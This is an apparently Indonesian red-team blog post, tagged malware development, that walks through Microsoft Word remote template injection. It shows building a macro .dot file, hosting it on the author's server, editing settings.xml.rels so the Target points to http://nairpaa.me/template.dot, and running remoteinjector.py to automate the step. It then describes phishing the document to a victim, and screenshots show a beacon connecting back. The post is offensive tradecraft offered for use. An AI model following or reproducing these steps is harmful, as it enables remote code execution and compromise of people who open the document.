---
title: '03 - [MS Office - Word] Remote Template Injection'
date: 2023-07-19 14:30:22 +0700
categories: ['Red Team', 'Malware Development']
tags: [red team, weaponization, malware, ms office, macro, vba]     # TAG names should always be lowercase
author: nairpaa
---


Microsoft Word memiliki fitur yang memungkinkan pengguna untuk mengaitkan dokumen (file `.docx`) dengan template (file `.dot`) yang disimpan di lokasi lain (penyimpanan lokal maupun *remote*).

Penyerang bisa menyalahgunakan fitur ini dengan mengakses mengirimkan file dokumen `.docx` ke korban, lalu file tersebut akan menjalankan makro pada `.dot` yang disimpan di server penyerang. Teknik ini disebut **Remote Template Injection**.

## 0x1 - Creating a Remote Template Injection

### Step 1: Create a New Blank Document and Insert Your Desired Macro

Pertama-tama, buat dokumen yang menjalankan macro, lalu simpan file dengan ekstensi `.dot`.

> Contoh pembuatan macro telah saya bahas [di sini](/posts/vba-macro-word/#0x1---creating-a-malicious-macro).
{: .prompt-info }

![Membuat Macro pada Word](/assets/img/posts/remote-template-injection/1.png){: w="500" h="400" }
_Membuat Macro pada Word_

### Step 2: Upload the Malware To Team Server

*Upload* file `.dot` sebelumnya ke Team Server agar bisa di akses oleh korban. 

> Contoh proses *upload* file ke Team Server telah saya bahas [di sini](/posts/vba-macro-word/#step-6-upload-the-malware-to-team-server).
{: .prompt-info }

Dalam contoh ini saya menggunakan link berikut:

```
http://nairpaa.me/template.dot
```

### Step 3: Creating a Docx with a Preloaded Template

Buka Microsoft Word dan buat dokumen baru, lalu masuk ke **File > Options > Add-ins**. Pada "**Manage Template**" pilih `Template` dan tekan **Go**.

![Menu Word Options](/assets/img/posts/remote-template-injection/2.png){: w="650" h="550" }
_Menu Word Options_

Pada "**Document template**", pilih lokasi file `.dot` yang sebelumnya telah dibuat.

Jangan lupa untuk mencentang opsi "`Automatically update document styles`".

![Menentukan Template .dot](/assets/img/posts/remote-template-injection/3.png)
_Menentukan Template .dot_

Setelah itu, simpan file tersebut dengan ekstensi `.docx`.

### Step 4: Inject the Template

#### Manual

Untuk meng-*inject* file `.docx` tadi agar menjalankan template yang berada di `http://nairpaa.me/template.dot`, klik kanan pada file `.docx` tersebut dan pilih **7-Zip > Open archive**.

Masuk ke folder **word > rels**, klik kanan pada `settings.xml.rels` dan pilih **Edit**.

Ubah data target berikut:

```bash
Target="file:///C:\Path\to\template.dot"
```

Menjadi:

```bash
Target="http://nairpaa.me/template.dot"
```

![Mengubah Link Template](/assets/img/posts/remote-template-injection/4.png)
_Mengubah Link Template_

#### Automation

Kita juga bisa secara otomatis melakukan *template injection* ini menggunakan tool [remoteinjector](https://github.com/JohnWoodman/remoteinjector) yang dibuat oleh John [Woodman](https://twitter.com/JohnWoodman15).

```bash
python3 remoteinjector.py -w http://nairpaa.com/template.dot /path/to/document.docx
```


## 0x2 - Deliver the Malware To the Victim

Ada banyak cara untuk mengirimkan *malware* tersebut ke korban, salah satunya adalah dengan mengirimkannya melalui [email](/posts/office365-phishing-templates/).

Ketika korban membuka file Word tersebut dan mengklik **Enable Content**, maka *payload beacon* akan dijalankan.

![Enable Content](/assets/img/posts/remote-template-injection/5.png)
_Enable Content_

![Koneksi Beacon Berhasil Masuk](/assets/img/posts/remote-template-injection/6.png)
_Koneksi Beacon Berhasil Masuk_